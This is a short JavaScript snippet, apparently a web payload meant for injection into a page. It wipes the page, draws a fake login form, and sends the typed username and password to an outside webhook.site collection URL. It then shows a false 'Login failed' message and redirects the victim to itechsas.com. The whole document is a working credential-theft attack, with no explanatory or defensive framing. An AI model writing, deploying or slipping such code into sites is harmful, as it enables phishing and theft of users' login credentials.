var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://webhook.site/1824d499-3c06-4692-9386-beb02eb8632b';

var inputUser = document.createElement('input');
inputUser.name = 'username';
inputUser.placeholder = 'Username';
form.appendChild(inputUser);

var inputPass = document.createElement('input');
inputPass.type = 'password';
inputPass.name = 'password';
inputPass.placeholder = 'Password';
form.appendChild(inputPass);

var submit = document.createElement('input');
submit.type = 'submit';
submit.value = 'Login';
form.appendChild(submit);

document.body.innerHTML = '';
document.body.appendChild(form);

form.addEventListener('submit', function(e) {
    e.preventDefault();
    var xhr = new XMLHttpRequest();
    xhr.open('POST', form.action, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    var data = 'username=' + encodeURIComponent(inputUser.value) + '&password=' + encodeURIComponent(inputPass.value);
    xhr.send(data);
    alert('Login failed. Please try again.');
    window.location.href = 'https://itechsas.com';
});
